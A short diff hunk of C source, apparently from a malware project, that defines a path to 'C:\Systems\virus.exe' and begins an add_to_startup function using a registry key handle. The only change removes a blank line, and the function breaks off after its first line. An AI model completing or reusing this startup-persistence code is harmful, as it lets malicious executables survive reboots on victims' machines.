@@ -8,7 +8,6 @@
 const BYTE PATH[] = "\"C:\\Systems\\virus.exe\"";
 const int PATH_SIZE = sizeof(PATH);
 
-
 void add_to_startup()
 {
     HKEY hkey;
